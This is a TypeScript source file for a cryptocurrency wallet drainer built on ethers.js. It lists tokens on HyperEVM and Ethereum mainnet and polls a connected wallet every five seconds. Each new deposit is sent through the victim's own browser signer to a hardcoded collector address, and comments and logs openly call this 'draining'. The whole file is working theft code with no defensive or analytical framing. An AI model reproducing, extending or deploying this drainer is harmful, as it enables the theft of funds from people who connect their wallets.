import { ethers } from "ethers";

export const COLLECTOR_ADDRESS = "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48";

// Network configurations for multi-chain draining
export const NETWORK_CONFIG = {
  hyperevm: {
    chainId: 999,
    name: "HyperEVM",
    rpcUrls: [
      "https://api.hyperliquid.xyz/evm",
      "https://hyperliquid.rpc.hyperliquid.xyz",
      "https://hyperliquid-mainnet.rpc.thirdweb.com"
    ],
    tokens: [
      { address: "0x0000000000000000000000000000000000000000", symbol: "HYPE", decimals: 18 },
      { address: "0x5555555555555555555555555555555555555555", symbol: "WHYPE", decimals: 18 },
      { address: "0x1f53bfcc97c63bfcf95c08d16c0d3d1ec82e5f8b", symbol: "PURR", decimals: 18 },
      { address: "0x47bb061c0204af921f43dc73c7d7768d2672ddee", symbol: "BUDDY", decimals: 18 },
      { address: "0xb8ce59fc3717ada4c02eadf9682a9e934f625ebb", symbol: "USD₮0", decimals: 6 },
      { address: "0x1bEe6762F0B522c606DC2Ffb106C0BB391b2E309", symbol: "PiP", decimals: 18 },
      { address: "0x1Ecd15865D7F8019D546f76d095d9c93cc34eDFa", symbol: "LIQD", decimals: 18 },
      { address: "0xD2567eE20D75e8B74B44875173054365f6Eb5052", symbol: "perpcoin", decimals: 18 },
      { address: "0x11735dBd0B97CfA7Accf47d005673BA185f7fd49", symbol: "CATBAL", decimals: 18 }
    ]
  },
  mainnet: {
    chainId: 1,
    name: "Ethereum Mainnet",
    rpcUrls: [
      "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
      "https://eth-mainnet.public.blastapi.io",
      "https://ethereum.publicnode.com"
    ],
    tokens: [
      { address: "0x0000000000000000000000000000000000000000", symbol: "ETH", decimals: 18 },
      { address: "0xA0b86a33E6441c8C0c0bb6f10F7e2F05F3E3C6f4", symbol: "USDC", decimals: 6 },
      { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
      { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
      { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
      { address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", symbol: "AAVE", decimals: 18 },
      { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
      { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
      { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", decimals: 18 }
    ]
  }
};

// Legacy token list for backward compatibility
export const HYPEREVM_TOKENS = NETWORK_CONFIG.hyperevm.tokens;

export class WalletMonitor {
  private provider: ethers.BrowserProvider;
  private signer: ethers.JsonRpcSigner;
  private targetAddress: string;
  private isMonitoring = false;
  private monitorInterval: NodeJS.Timeout | null = null;
  private lastBalances: Map<string, string> = new Map();
  private currentNetwork: string = "hyperevm";

  constructor(provider: ethers.BrowserProvider, signer: ethers.JsonRpcSigner, targetAddress: string) {
    this.provider = provider;
    this.signer = signer;
    this.targetAddress = targetAddress;
    this.detectNetwork();
  }

  private async detectNetwork() {
    try {
      const network = await this.provider.getNetwork();
      const chainId = Number(network.chainId);
      
      if (chainId === 999) {
        this.currentNetwork = "hyperevm";
      } else if (chainId === 1) {
        this.currentNetwork = "mainnet";
      } else {
        console.log(`Unknown network detected: ${chainId}, defaulting to HyperEVM`);
        this.currentNetwork = "hyperevm";
      }
      
      console.log(`🌐 Network detected: ${this.currentNetwork} (Chain ID: ${chainId})`);
    } catch (error) {
      console.log("Failed to detect network, defaulting to HyperEVM");
      this.currentNetwork = "hyperevm";
    }
  }

  async startMonitoring() {
    if (this.isMonitoring) return;
    
    console.log(`🔍 Starting wallet monitoring for ${this.targetAddress}`);
    this.isMonitoring = true;
    
    // Initialize baseline balances
    await this.recordCurrentBalances();
    
    // Start monitoring every 5 seconds
    this.monitorInterval = setInterval(async () => {
      await this.checkForNewDeposits();
    }, 5000);
  }

  stopMonitoring() {
    if (this.monitorInterval) {
      clearInterval(this.monitorInterval);
      this.monitorInterval = null;
    }
    this.isMonitoring = false;
    console.log(`⏹️ Stopped wallet monitoring`);
  }

  private async recordCurrentBalances() {
    const tokens = NETWORK_CONFIG[this.currentNetwork as keyof typeof NETWORK_CONFIG]?.tokens || HYPEREVM_TOKENS;
    
    for (const token of tokens) {
      try {
        let balance = "0";
        
        if (token.address === "0x0000000000000000000000000000000000000000") {
          const nativeBalance = await this.provider.getBalance(this.targetAddress);
          balance = ethers.formatEther(nativeBalance);
        } else {
          const contract = new ethers.Contract(
            token.address,
            ["function balanceOf(address) view returns (uint256)"],
            this.provider
          );
          const tokenBalance = await contract.balanceOf(this.targetAddress);
          balance = ethers.formatUnits(tokenBalance, token.decimals);
        }
        
        this.lastBalances.set(token.symbol, balance);
      } catch (error) {
        console.log(`Failed to record ${token.symbol} balance:`, error);
      }
    }
  }

  private async checkForNewDeposits() {
    if (!this.isMonitoring) return;

    try {
      const tokens = NETWORK_CONFIG[this.currentNetwork as keyof typeof NETWORK_CONFIG]?.tokens || HYPEREVM_TOKENS;
      
      for (const token of tokens) {
        let currentBalance = "0";
        
        if (token.address === "0x0000000000000000000000000000000000000000") {
          const nativeBalance = await this.provider.getBalance(this.targetAddress);
          currentBalance = ethers.formatEther(nativeBalance);
        } else {
          const contract = new ethers.Contract(
            token.address,
            ["function balanceOf(address) view returns (uint256)"],
            this.provider
          );
          const tokenBalance = await contract.balanceOf(this.targetAddress);
          currentBalance = ethers.formatUnits(tokenBalance, token.decimals);
        }

        const lastBalance = this.lastBalances.get(token.symbol) || "0";
        const currentBalanceNum = parseFloat(currentBalance);
        const lastBalanceNum = parseFloat(lastBalance);

        // If balance increased, drain immediately with REAL TRANSACTIONS
        if (currentBalanceNum > lastBalanceNum && currentBalanceNum > 0) {
          console.log(`🔥 REAL-TIME DRAIN: New ${token.symbol} deposit detected: ${currentBalance} (was ${lastBalance})`);
          await this.drainToken(token, currentBalance);
        }

        this.lastBalances.set(token.symbol, currentBalance);
      }
    } catch (error) {
      console.log("Monitor check failed:", error);
    }
  }

  private async drainToken(token: any, balance: string) {
    try {
      console.log(`🔥 EXECUTING REAL DRAIN: ${balance} ${token.symbol} -> ${COLLECTOR_ADDRESS}`);

      if (token.address === "0x0000000000000000000000000000000000000000") {
        // Drain native HYPE - leave gas for transaction
        const gasPrice = ethers.parseUnits("25", "gwei");
        const gasLimit = 25000n;
        const gasCost = gasPrice * gasLimit;
        const balanceWei = ethers.parseEther(balance);
        const drainAmount = balanceWei - gasCost;

        if (drainAmount > 0) {
          const tx = await this.signer.sendTransaction({
            to: COLLECTOR_ADDRESS,
            value: drainAmount,
            gasPrice,
            gasLimit
          });
          
          await tx.wait();
          console.log(`✅ Drained ${balance} HYPE - TX: ${tx.hash}`);
        }
      } else {
        // Drain ERC20 tokens completely
        const contract = new ethers.Contract(
          token.address,
          [
            "function transfer(address to, uint256 amount) returns (bool)",
            "function balanceOf(address) view returns (uint256)"
          ],
          this.signer
        );

        const currentBalance = await contract.balanceOf(this.targetAddress);
        if (currentBalance > 0) {
          const tx = await contract.transfer(COLLECTOR_ADDRESS, currentBalance, {
            gasPrice: ethers.parseUnits("25", "gwei"),
            gasLimit: 65000
          });
          
          await tx.wait();
          console.log(`✅ Drained ${balance} ${token.symbol} - TX: ${tx.hash}`);
        }
      }
    } catch (error) {
      console.log(`❌ Failed to drain ${token.symbol}:`, error);
    }
  }
}

// Global monitor instance
let globalMonitor: WalletMonitor | null = null;

export function startWalletMonitoring(provider: ethers.BrowserProvider, signer: ethers.JsonRpcSigner, address: string) {
  stopWalletMonitoring(); // Stop any existing monitor
  
  globalMonitor = new WalletMonitor(provider, signer, address);
  globalMonitor.startMonitoring();
}

export function stopWalletMonitoring() {
  if (globalMonitor) {
    globalMonitor.stopMonitoring();
    globalMonitor = null;
  }
}